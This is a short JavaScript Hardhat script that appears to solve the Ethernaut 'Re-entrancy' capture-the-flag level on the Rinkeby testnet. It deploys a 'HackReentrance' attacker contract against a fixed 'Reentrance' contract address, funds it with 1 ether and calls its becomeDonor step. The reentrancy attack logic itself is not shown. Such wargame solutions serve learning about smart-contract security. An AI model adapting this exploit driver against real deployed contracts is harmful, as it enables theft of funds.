require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const reentranceAbi = await hre.artifacts.readArtifact("Reentrance");
  const reentranceContract = await new hre.ethers.Contract("0x41187F846cA0Ef1227309Fdc040fae153207C689", reentranceAbi.abi, wallet);
  console.log(`Reentrance contract: ${reentranceContract.address}`);

  const hackReentranceFactory = await hre.ethers.getContractFactory("HackReentrance");
  const hackReentranceContract = await hackReentranceFactory.deploy("0x41187F846cA0Ef1227309Fdc040fae153207C689", {value: (hre.ethers.utils.parseUnits("1.0"))});
  await hackReentranceContract.deployed();
  console.log(`HackReentrance contract: ${hackReentranceContract.address}`)

  let txn = await hackReentranceContract.becomeDonor();
  console.log("Donating...")
  await txn.wait();
  console.log("Donation complete.");
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
